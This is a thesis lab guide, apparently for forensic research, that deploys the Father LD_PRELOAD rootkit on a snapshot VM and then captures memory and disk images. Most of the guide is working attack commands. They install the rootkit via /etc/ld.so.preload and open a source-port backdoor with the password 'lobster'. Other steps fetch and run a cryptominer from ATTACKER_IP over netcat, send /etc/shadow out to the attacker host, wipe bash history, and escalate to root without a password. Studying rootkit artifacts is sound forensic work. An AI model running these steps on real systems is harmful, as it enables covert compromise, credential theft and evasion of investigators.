# Father Rootkit - Manual Deployment Guide

Execute commands step-by-step by copying from code blocks below.  
All timestamps logged with `log` function.

**Timeline:** T0, T1, ... in order to track timeline. Results saved in ~/thesis/experiments/$EXP/$EXP_timeline.txt

***note***: 
- `#[HOST] Timestamp` means that the command `log "..."` must be executed on the main terminal (outside backdoor and ssh session)
- `[optional]` indicates step that can be skipped in order to maximize number of artifacts.
---

## T0: EXPERIMENT SETUP

```bash
cd ~/thesis

# Configuration variables
VM='ubuntu22-forensics' \
SSH='ubuntu-22' \
SNAP='clean-vanilla' \
EXP='father_u22'

# simple helpers for logging (Ex. log T0: ...)
tstp() { date -u +%H:%M:%S; }
log() { echo "[$(tstp)] $1" | tee -a experiments/$EXP/${EXP}_timeline.txt; }

# Create dir for experiments results
mkdir -p experiments/$EXP

# Timestamp: T0 start
log "T0: Start experiment"

# Reset VM to clean snapshot
virsh snapshot-revert $VM $SNAP && virsh start $VM
sleep 10

# Get network configuration
VM_IP=$(virsh domifaddr $VM | grep -oP '(\d{1,3}\.){3}\d{1,3}' | head -1)
ATTACKER_IP=$(ip -4 addr show virbr1 | awk '/inet / {print $2}' | cut -d/ -f1)

echo "VM IP: $VM_IP"
echo "Attacker IP: $ATTACKER_IP"
```

---

## T1: DEPLOY FATHER

```bash
# Timestamp: T1 Father deployment
log "T1: Deploy Father"

# Copy rootkit to VM
scp ~/thesis/attack_tools/Father/rk.so $SSH:/tmp/

# SSH into VM for installation
ssh $SSH

# Install Father rootkit - root password (labuser) needed for this step
sudo cp /tmp/rk.so /lib/selinux.so.3
sudo sh -c 'echo "/lib/selinux.so.3" > /etc/ld.so.preload'

# Restart services to load Father
sudo systemctl restart ssh rsyslog

# Verify Father is loaded 
ldd /bin/ps | grep selinux.so.3 # "not a dynamic executable" expected, rootkit is blocking this listing

# Exit back to HOST
exit
```

**back on HOST**

---

## BACKGROUND SERVICES

```bash
# Host cryptominer script (waits for victim to download)
nc -q 1 -l -p 8888 < ~/thesis/attack_tools/cryptominer.sh &

# Listen for exfiltrated data
nc -l -p 9999 > ~/thesis/experiments/$EXP/exfil_shadow.txt < /dev/null &
```

---

## T2-T6: BACKDOOR ACCESS

```bash
# Timestamp: T2 Backdoor connection
log "T2: Backdoor connection"

# Connect to backdoor into another terminal (source port 54321 triggers Father)
nc $VM_IP 22 -p 54321

# Authentication prompt appears, type default Father backdoor password:
lobster

# verify root access
whoami

# [HOST] Timestamp: T3 Download and execute cryptominer
log "T3: Download cryptominer"

ATTACKER_IP=192.168.100.1  # change ATTACKER_IP here
nc -w 3 $ATTACKER_IP 8888 > /tmp/___cryptominer.sh < /dev/null

chmod +x /tmp/___cryptominer.sh
nohup /tmp/___cryptominer.sh > /dev/null 2>&1 &

# [HOST] Timestamp: T4 Exfiltrate shadow file
log "T4: Exfiltrate shadow file"

cp /etc/shadow /tmp/___shadow
nc -w 5 $ATTACKER_IP 9999 < /tmp/___shadow # Wait ~5 seconds for Terminal 3 to receive file

# [HOST] Timestamp: T5 Create additional hidden files
log "T5: Create hidden files"

echo 'sensitive data' > /tmp/___secret.txt
echo 'exfil plan' > /tmp/___notes.txt

# [optional] [HOST] Timestamp: T6 Cleanup files and bash history 
log "T6: Cleanup rootkit file and bash history"

# [optional]: delete rootkit file and history
rm /tmp/rk.so
rm /root/.bash_history
rm /home/labuser/.bash_history 2>/dev/null || true
history -c

^C # exit from backdoor shell => N.B leave terminal open for educational purpose in order to maximize mem artifacts
```

---

## T7: PRIVILEGE ESCALATION TEST (HOST - Terminal 1)

```bash
# Timestamp: T7 Privilege escalation
log "T7: Privilege escalation"

# In another terminal, SSH to VM as normal user
ssh $SSH

whoami # verify labuser standard access 

# Use Father magic string to escalate (NO password required!)
lobster=a sudo bash

# Now root without password prompt!
whoami
id

# Verify Father configuration
cat /etc/ld.so.preload

# [optional] Exit root shell
exit

# [optional] Exit SSH 
exit
```
---

## T8: FORENSIC ACQUISITION (HOST - Terminal 1)

```bash
# Timestamp: T8 Acquisition start
log "T8: Acquisition start"

# Run acquisition script (~5-10 minutes)
cd ~/thesis/scripts/

./acquisition/acquire.sh $VM $EXP

# Verify results
ls -lh ~/thesis/experiments/$EXP/

cd ../..
log "T9: Acquisition end"

```
---

## EXPERIMENT COMPLETE

Results saved in: `~/thesis/experiments/father_u22`

Files generated:

- `memory.dump` - Memory acquisition
- `disk.E01` - Disk image
- `exfil_shadow_*.txt` - Exfiltrated data
- `manifest.txt` - Acquisition metadata
- `/tmp/father_session_*.log` - Complete command log with timestamps

---

## Next Steps - analysis

Automated execution for Vol3 plugin and sleuth-kit commands:

```bash
cd ~/thesis/scripts
EXP='father_u22'
MEM_DUMP="../experiments/$EXP/memory.dump"
DISK_DUMP="../experiments/$EXP/disk.E01"

./analysis/mem_analyze.sh $MEM_DUMP $(dirname $MEM_DUMP)/mem_analysis

./analysis/disk_analyze.sh $DISK_DUMP $(dirname $DISK_DUMP)/disk_analysis #run in parallel on another terminal to optimize time!

```

## OPTIONAL: Sysadmin Verification Demo

** IMPORTANT:** Execute this section ONLY AFTER acquisition is complete.
This demonstrates Father's hiding capabilities but creates additional artifacts.

**Purpose:** Show that Father hides files/processes from sysadmin tools.

```bash
# SSH to VM
ssh $SSH
```

### Inside VM - Sysadmin checks

```bash
# Escalate to root for inspection
sudo -i

# Check /tmp directory (hidden files not visible)
ls /tmp/

# Try to read hidden file (Father blocks)
cat /tmp/___secret.txt
# Expected: No such file or directory

# Try to read ld.so.preload (Father hides it)
cat /etc/ld.so.preload
# Expected: No such file or directory

# Bypass Father with low-level tool
sudo debugfs -R 'cat /etc/ld.so.preload' /dev/vda2
# Expected output: /lib/selinux.so.3

# Check running processes (cryptominer hidden)
ps aux | grep ___cryptominer
# Expected: not found

top
# Press 'q' to quit top

# Check network connections (port 54321 might be hidden)
ss -tunap

# Check bash history
cat ~/.bash_history
cat /home/labuser/.bash_history

```

**Demo complete**

---

## Notes

- Father hides: processes, files, network connections, ld.so.preload
- Backdoor access: port 54321 (source port), auth: `lobster`
- Privilege escalation: `lobster=a sudo` bypasses password
- History cleanup: `history -c` + file deletion for anti-forensics
- Forensics: Memory + Disk analysis will reveal all hidden artifacts

---

## Timeline Summary

| Phase | Description | Duration |
| :-- | :-- | :-- |
| T0 | Experiment setup | ~1 min|
| T1 | Father deployment + VM restart | ~2 min |
| T2 | Backdoor connection + auth | ~1 min |
| T3 | Cryptominer download | ~1 min |
| T4 | Shadow exfiltration | ~1 min |
| T5 | Additional hidden file creation | instant |
| T6 | History and rootkit file cleanup | instant |
| T7 | Privilege escalation test | ~1 min |
| T8 | Forensic acquisition | ~5-10 min |

**Total:** ~10-15 minutes

